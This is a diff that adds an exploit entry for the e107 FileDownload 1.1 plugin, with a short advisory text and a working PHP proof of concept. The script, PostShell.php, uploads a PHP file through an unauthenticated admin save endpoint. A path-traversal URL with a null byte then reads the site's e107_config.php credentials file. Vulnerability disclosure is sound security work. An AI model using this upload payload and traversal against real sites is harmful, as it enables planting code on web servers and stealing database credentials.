@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/54098/info
+
+The FileDownload Plugin for e107 is prone to an arbitrary file-upload vulnerability and a remote file-disclosure vulnerability because the application fails to adequately sanitize user-supplied input.
+
+An attacker can exploit these issues to upload a file and view local files in the context of the web server process, which may aid in further attacks.
+
+FileDownload 1.1 is vulnerable; other versions may also be affected. 
+
+PostShell.php
+<?php
+
+$ch = curl_init("http://www.example.com/e107/e107_plugins/filedownload/filedownload/file_info/admin/save.php");
+curl_setopt($ch, CURLOPT_POST, true);   
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+               array('filename'=>'lo.php',
+          'accesses'=>'<?php phpinfo(); ?>'));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+   
+print "$postResult";
+
+?>
+
+http://www.example.com/e107/e107_plugins/filedownload/filedownload/file_info/admin/edit.php?file=../../../../../e107_config.php%00 
